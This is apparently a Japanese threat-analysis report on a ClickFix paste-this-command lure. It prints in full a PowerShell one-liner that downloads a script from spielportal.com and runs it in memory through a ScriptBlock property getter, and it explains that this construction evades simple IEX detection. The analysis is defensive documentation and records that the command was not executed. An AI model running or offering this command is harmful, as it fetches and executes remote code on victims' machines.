# ClickFix command解析: pt5, pt6, pt7

## 概要

`clickfix-command.txt`で収集済みのpt5, pt6, pt7を、実行せずに文字列・process・後段取得境界へ分解した結果です。
ClickFixはmalware familyではなく、利用者にcommandを貼り付けさせる初期アクセス手法として扱います。

- case ID: `20260825-command-pt5-pt6-pt7`
- stage domain: `spielportal.com`
- command SHA-256: `5b991f36902bf1f536bcc3e43298e4b7f78fb95184d88dfeaf4cd6f3cf590fff`
- source file SHA-256: `8326ca91fcb530acaebfa6a42ea240fdfc6321e73090043cc60f63bd4d8296b0`
- 重複数: `3`
- command実行: `false`
- payload実行: `false`

## 実command line

```powershell
powershell -c "$a=irm 'spielportal.com/cj5JpRGuScm5B9ok7';$o=[pscustomobject]@{v=1};$o|Add-Member ScriptProperty p ([ScriptBlock]::Create($a));$o.p|Out-Null"
```

## 復号結果

```text
該当なし（原文のまま解釈）
```

## 悪性process挙動

```text
利用者起点（Run dialogまたは既存shell） → powershell.exe → ScriptBlock.Create → ScriptProperty getter評価（同一process）
```

- pt5、pt6、pt7はbyte単位で同一である。
- irm応答を$aへ保持し、[ScriptBlock]::Create($a)でscript blockへ変換する。
- Add-Member ScriptPropertyでgetter pとして登録し、$o.pのproperty readを実行triggerにする。
- iex文字列を使わずに任意PowerShellを実行する間接評価であり、単純なIEX検知を回避する。
- 取得文字列はschemeを省略している。

## 最終取得状態

- analyst probe: `https://spielportal.com/cj5JpRGuScm5B9ok7`
- 結果: `timeout`
- 後段script／payload復元: `false`

現在の限定GETでは実行可能な後段本文を復元できませんでした。したがって、確実に言える最終ローカル動作は「HTTP応答をPowerShellとしてメモリ内評価する」境界までです。後段が生成する追加process、永続化、最終malware familyは未確認であり、推測で補っていません。

schemeを省略したraw locatorは原文どおり記録し、analyst probeだけ`https://`へ正規化しています。probe結果を実行時証跡とは扱いません。

## 関連成果物

- [processとcommand詳細](OVERALL-LOGIC.md)
- [感染チェーン](INFECTION-CHAIN.md)
- [特徴](FEATURES.md)
- [IOC](IOC-LIST.md)
- [構造化解析](analysis.json)
